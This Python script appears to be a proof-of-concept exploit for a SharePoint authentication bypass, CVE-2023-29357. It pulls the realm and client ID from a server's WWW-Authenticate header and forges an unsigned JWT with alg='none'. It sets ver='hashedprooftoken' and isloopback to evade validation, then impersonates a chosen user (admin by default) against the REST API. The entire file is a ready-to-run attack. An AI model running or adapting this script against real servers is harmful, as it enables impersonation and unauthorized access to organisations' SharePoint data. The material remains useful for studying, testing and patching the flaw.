#!/usr/bin/env python3
"""
Test JWT "none" algorithm authentication bypass (CVE-2023-29357)
Based on historical research from previous_sp_related_writeups/summary.md and previous_exploits_github_projects/summary.md

Technique:
1. Extract realm and client_id from WWW-Authenticate header
2. Forge JWT with alg="none" (no signature)
3. Set ver="hashedprooftoken", isloopback=true
4. Send in both Authorization and X-PROOF_TOKEN headers
"""

import requests
import json
import base64
import time
import sys
import argparse

def extract_realm_and_client_id(target_url):
    """Extract realm and client_id from WWW-Authenticate header"""
    print("[*] Extracting realm and client_id from target...")

    # Send request with empty Bearer token to trigger WWW-Authenticate header
    headers = {"Authorization": "Bearer"}
    response = requests.get(f"{target_url}/_api/web/currentuser", headers=headers, allow_redirects=False)

    print(f"[*] Status: {response.status_code}")

    if "WWW-Authenticate" in response.headers:
        www_auth = response.headers["WWW-Authenticate"]
        print(f"[*] WWW-Authenticate header found: {www_auth}")

        # Parse realm and client_id from header
        # Format: Bearer realm="<realm>",client_id="<client_id>",trusted_issuers="<issuers>",authorization_uri="<uri>"
        realm = None
        client_id = None

        if 'realm="' in www_auth:
            realm = www_auth.split('realm="')[1].split('"')[0]
        if 'client_id="' in www_auth:
            client_id = www_auth.split('client_id="')[1].split('"')[0]

        print(f"[+] Extracted realm: {realm}")
        print(f"[+] Extracted client_id: {client_id}")

        return realm, client_id
    else:
        print("[-] WWW-Authenticate header not found")
        return None, None

def create_jwt_token_none_alg(realm, client_id, username="admin"):
    """Create JWT token with alg='none' (no signature)"""
    print(f"\n[*] Creating forged JWT token with alg='none'...")

    # JWT Header with "none" algorithm
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    # JWT Payload
    current_time = int(time.time())
    payload = {
        "aud": f"{client_id}@{realm}",
        "iss": client_id,
        "nbf": current_time - 300,  # Not before (5 min ago)
        "exp": current_time + 3600,  # Expires in 1 hour
        "ver": "hashedprooftoken",  # Bypass issuer validation
        "isloopback": True,  # Bypass SSL requirement
        "nameid": username,  # Target user to impersonate
        "nii": f"urn:office:idp:activedirectory",
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",  # Hardcoded hash
        "endpointurlLength": "1"
    }

    # Encode header and payload (no signature for "none" algorithm)
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

    # JWT format: header.payload.signature (signature is empty for "none")
    jwt_token = f"{header_b64}.{payload_b64}."

    print(f"[+] JWT token created: {jwt_token[:100]}...")

    return jwt_token

def test_auth_bypass(target_url, jwt_token):
    """Test authentication bypass using forged JWT token"""
    print(f"\n[*] Testing authentication bypass with forged JWT...")

    # Headers with forged JWT in both Authorization and X-PROOF_TOKEN
    headers = {
        "Authorization": f"Bearer {jwt_token}",
        "X-PROOF_TOKEN": jwt_token,
        "Accept": "application/json;odata=verbose"
    }

    # Test against /_api/web/currentuser endpoint
    test_endpoint = f"{target_url}/_api/web/currentuser"
    print(f"[*] Testing endpoint: {test_endpoint}")

    response = requests.get(test_endpoint, headers=headers, allow_redirects=False)

    print(f"\n[*] Response status: {response.status_code}")
    print(f"[*] Response headers:")
    for header, value in response.headers.items():
        print(f"    {header}: {value}")

    print(f"\n[*] Response body (first 500 chars):")
    print(response.text[:500])

    # Check if bypass was successful
    if response.status_code == 200 and "LoginName" in response.text:
        print("\n[+] SUCCESS! Authentication bypass worked!")
        print("[+] User details retrieved without authentication")
        return True
    elif response.status_code == 401:
        print("\n[-] FAILURE: 401 Unauthorized - Bypass did not work")
        return False
    else:
        print(f"\n[?] Unexpected response: {response.status_code}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Test JWT 'none' algorithm auth bypass")
    parser.add_argument("--url", required=True, help="Target SharePoint URL")
    parser.add_argument("--username", default="admin", help="Username to impersonate")
    args = parser.parse_args()

    target_url = args.url.rstrip('/')

    # Step 1: Extract realm and client_id
    realm, client_id = extract_realm_and_client_id(target_url)

    if not realm or not client_id:
        print("\n[-] Failed to extract realm/client_id. Trying with default values...")
        # Try with default SharePoint client_id
        client_id = "00000003-0000-0ff1-ce00-000000000000"
        print(f"[*] Using default client_id: {client_id}")

        # Realm might be extractable from 401 response
        if realm:
            print(f"[*] Using extracted realm: {realm}")
        else:
            print("[-] Cannot proceed without realm. Exiting.")
            return

    # Step 2: Create forged JWT with alg="none"
    jwt_token = create_jwt_token_none_alg(realm, client_id, args.username)

    # Step 3: Test authentication bypass
    test_auth_bypass(target_url, jwt_token)

if __name__ == "__main__":
    main()
